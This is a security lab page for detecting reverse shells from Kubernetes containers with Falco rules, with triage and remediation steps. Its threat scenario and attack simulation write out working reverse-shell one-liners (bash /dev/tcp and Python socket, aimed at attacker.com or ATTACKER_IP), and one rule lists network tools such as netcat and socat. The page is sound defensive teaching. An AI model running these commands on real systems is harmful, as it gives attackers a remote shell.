---
title: "LAB-006: Reverse Shell from a Container"
description: "A container opens an outbound connection and pipes it to a shell interpreter. This is one of the clearest signals of active compromise — detect it before the attacker completes their objective."
date: "2026-04-05"
mitre: "T1059 - Command and Scripting Interpreter"
mitre_url: "https://attack.mitre.org/techniques/T1059/"
severity: "critical"
tags: ["Falco", "runtime detection", "execution", "MITRE T1059", "reverse shell", "container"]
github_path: "labs/lab-006-reverse-shell"
---

## Threat scenario

An attacker has exploited a remote code execution vulnerability in a container — a deserialization flaw, an RCE in a web framework, or a command injection. Their goal is a persistent interactive shell. They call back to their command-and-control server by piping a network socket to a shell interpreter: `bash -i >& /dev/tcp/attacker.com/4444 0>&1`.

The container now has an outbound shell tunnel to the attacker's infrastructure. Unless you have syscall-level visibility, you will not see this in application logs.

---

## Why this matters

A reverse shell is post-exploitation, not reconnaissance. By the time this fires, the attacker:

- Has already identified a vulnerability and executed code
- Has established a persistent communication channel
- Can now execute any command, read any file the container process can access, and attempt lateral movement

Detection speed matters here. The median time from reverse shell establishment to lateral movement in cloud environments is measured in minutes. This is your highest-urgency alert class.

**MITRE ATT&CK:** [T1059 — Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/)  
**Tactic:** Execution  
**Severity:** Critical

---

## Attack simulation

```bash
# On your attacker machine (or a second terminal), start a listener
# nc -lvnp 4444

# Deploy a vulnerable test pod
kubectl run lab006 --image=ubuntu:22.04 --restart=Never -- sleep 3600
kubectl wait --for=condition=ready pod/lab006

# Simulate a reverse shell from inside the container
# (Replace ATTACKER_IP with your listener address)
kubectl exec lab006 -- bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" &

# Alternative: Python reverse shell (common in Python-based apps)
kubectl exec lab006 -- python3 -c \
  "import socket,subprocess,os; s=socket.socket(); s.connect(('ATTACKER_IP',4444)); \
   os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); \
   subprocess.call(['/bin/sh','-i'])"
```

Expected result: Falco fires a CRITICAL alert on the network-connected shell process. The process event shows `proc.name=bash` or `proc.name=sh` with a network file descriptor.

---

## Falco detection rule

```yaml
- rule: Reverse Shell Detected
  desc: >
    A shell process was spawned with a network socket as stdin/stdout/stderr.
    This is the primary indicator of a reverse shell — a critical runtime signal.
  condition: >
    spawned_process and container and
    proc.name in (shell_binaries) and
    (fd.type = ipv4 or fd.type = ipv6) and
    fd.direction = outbound
  output: >
    Reverse shell in container
    (user=%user.name proc=%proc.name
     container=%container.name image=%container.image.repository
     connection=%fd.name k8s_ns=%k8s.ns.name k8s_pod=%k8s.pod.name)
  priority: CRITICAL
  tags: [container, reverse_shell, T1059, execution]

- rule: Network Tool Spawned in Container
  desc: >
    A network utility (netcat, ncat, socat) was spawned inside a container.
    These tools are not present in production images and indicate either
    an attacker or a misconfigured image.
  condition: >
    spawned_process and container and
    proc.name in (nc, ncat, netcat, socat, nmap) and
    not container.image.repository in (known_debug_images)
  output: >
    Network tool in container
    (user=%user.name proc=%proc.name cmdline=%proc.cmdline
     container=%container.name image=%container.image.repository
     k8s_ns=%k8s.ns.name k8s_pod=%k8s.pod.name)
  priority: HIGH
  tags: [container, network_tool, T1059, execution]
```

---

## Triage guide

When this alert fires:

1. **Isolate immediately** — a reverse shell is a confirmed compromise indicator, not a false positive candidate. Isolate the pod before investigation, not after.

2. **Capture the connection details** — the `fd.name` field in the Falco output contains the destination IP and port. Look up the destination IP immediately. Is it a known attacker infrastructure range? A cloud provider IP? An internal address?

3. **Identify the vulnerable entrypoint** — work backwards from the shell spawn. What process was the parent? What network request preceded the exec? This identifies the vulnerability class.

4. **Check for lateral movement** — after isolating the pod, check whether the service account token was read (LAB-004), whether the pod made any API server calls, or whether other pods in the same namespace show similar events.

**Escalate if:** Always. A reverse shell in a production container is a confirmed security incident.  
**Close if:** Never close without full investigation. If the pod was a test pod and the exec was intentional, document it explicitly.

---

## Remediation

**Immediate:**
```bash
# Isolate the pod — label it and remove from service endpoints
kubectl label pod <pod-name> quarantine=true --overwrite
kubectl patch pod <pod-name> -p '{"spec":{"containers":[{"name":"<container>","image":"pause"}]}}'

# Capture state for forensics before termination
kubectl describe pod <pod-name> > /tmp/pod-forensics.txt
kubectl logs <pod-name> --previous >> /tmp/pod-forensics.txt
```

**Structural:**
- Use network policies to restrict egress from application pods to only required destinations. An unrestricted egress path is what makes reverse shells easy.
- Use distroless or minimal base images — removing `bash`, `sh`, `nc`, and `python` from production images eliminates the most common reverse shell vectors.
- The [Detection Starter Pack](/services/#detection-starter) includes this rule with tuned egress-aware conditions and paired network policy recommendations.

---

## False positive notes

| Source | Pattern | Mitigation |
|--------|---------|------------|
| Debug images | Ubuntu/Debian base images include shells and netcat | Use distroless images in production; exception for dev namespaces |
| Init containers | Some init scripts use shell with redirection | Review init script design; avoid network-connected init scripts |
| Health checks | Unusual health check implementations | Replace with proper probe endpoints |

This rule has a very low false positive rate for production workloads using minimal base images. If you see frequent false positives, the root cause is almost always an image hygiene problem, not a detection logic problem.

---

## References

- [MITRE ATT&CK T1059](https://attack.mitre.org/techniques/T1059/)
- [Falco — Network rules](https://falco.org/docs/rules/default-rules/)
- [Kubernetes — Network Policies](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [ClarifyIntel Detection Starter Pack](/services/#detection-starter)
